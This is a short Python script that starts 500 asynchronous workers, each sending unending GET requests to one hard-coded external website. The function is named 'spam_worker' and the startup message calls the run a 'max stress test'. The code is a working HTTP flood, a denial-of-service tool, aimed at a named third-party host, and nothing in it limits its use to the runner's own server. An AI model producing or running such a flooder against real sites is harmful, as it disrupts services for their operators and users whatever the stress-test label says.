import asyncio
import aiohttp
import random

URL = "https://elinsrc-server.ru/"

async def spam_worker(session, id):
    while True:
        try:
            async with session.get(URL, timeout=5) as resp:
                status = resp.status
                # Читаем только начало ответа, чтобы не загружать память
                text = await resp.text()
                print(f"[{id}] {status} {URL} -> {text[:60]}")
        except Exception as e:
            print(f"[{id}] ERR {URL} -> {e}")

async def main(concurrency=500):
    timeout = aiohttp.ClientTimeout(total=10)
    connector = aiohttp.TCPConnector(limit=concurrency)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = []
        for i in range(concurrency):
            tasks.append(asyncio.create_task(spam_worker(session, i)))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("Starting max stress test. Press Ctrl+C to stop.")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Stopped by user")
